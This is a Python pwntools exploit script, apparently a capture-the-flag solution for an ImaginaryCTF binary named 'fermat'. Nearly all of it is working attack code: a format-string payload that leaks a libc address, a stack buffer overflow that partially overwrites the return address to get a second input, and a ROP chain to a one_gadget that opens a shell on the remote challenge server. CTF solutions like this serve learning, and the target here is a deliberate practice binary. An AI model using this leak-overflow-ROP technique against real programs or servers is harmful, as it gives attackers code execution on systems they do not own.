from pwn import *
import sys

#Cre: vilex1337

_path = "./vuln_patched"
exe = ELF(_path)
libc = ELF("./libc.so.6")
#ld = ELF("./ld-linux-x86-64.so.2")
add = 'fermat.chal.imaginaryctf.org'
port = 1337
cmd = '''
    b *main + 155
    continue
'''

_option = {'run' : process(_path), 
           'exp' : remote(add, port)}

def conn():
    if(len(sys.argv) == 1):
        return gdb.debug(_path, cmd)
    return _option[sys.argv[1]]

def p(_data):
    return p64(_data, endian = 'little')

chall = conn()

def check():
    chall.interactive()
    exit()

def main():
    #This challenge allow us to use format string but %n, we no need to use it because there also bof.
    #My idea is that first time i input, i will take libc address from format string and then overflow 1 lower bytes of return address 
    #so that i could able to bof 1 more time. 
    #Then rop to one_gadget and get the shell.
    payload = b'|%39$p|'
    payload += b'a' * (0x108 - len(payload) ) + b'\x6d'
    chall.send(payload)
    chall.recvuntil(b'|')
    libc.address = int(chall.recvuntil(b'|')[:-1], 16) - 0x29d6d
    print(hex(libc.address))
    sleep(5)
    _pop_r12_r13 = libc.address + 0x9edeb
    _one_gadget = libc.address + 0xebd52
    _bss = libc.address + 0x21a000
    payload = b'a' * 0x100 + p(_bss) + p(_pop_r12_r13) + p(0) * 2 + p(_one_gadget)
    chall.send(payload)
    chall.interactive()


if __name__ == "__main__":
    main()

